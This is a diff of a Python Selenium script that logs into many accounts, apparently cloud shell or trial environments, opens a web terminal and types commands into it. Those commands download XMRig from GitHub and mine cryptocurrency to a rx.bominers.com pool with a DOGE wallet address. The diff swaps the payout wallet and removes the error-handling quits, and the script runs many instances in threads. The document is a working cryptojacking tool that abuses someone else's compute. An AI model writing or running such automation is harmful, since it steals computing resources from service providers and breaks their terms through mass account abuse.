@@ -67,7 +67,7 @@ def open_browser(instance_number, email, password):
         print(f"[{email}] ✅ Clicked Launch button")
     except:
         print(f"[{email}] ❌ Launch button not found")
-        driver.quit()
+        
     original_window = driver.current_window_handle
 
 # Wait for new window/tab to open
@@ -90,16 +90,16 @@ def open_browser(instance_number, email, password):
         print("✅ Command executed.")
     except:
         print(f"[{email}] ❌ area not found ")
-        driver.quit()
+        
     
     try:
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
         print("SUCCES")        
-        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.bominers.com:3333 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email} -p -k --threads=4")
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.bominers.com:3333 -u DOGE:DDXHWnNzB5dyxjCe4xrsxJHDefwAWH1bhE{email}#gvkv-lvzh -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
     except:
         print(f"[{email}] ❌ terminal not found ")
-        driver.quit()
+        
 
 # Launch multiple instances
 threads = []
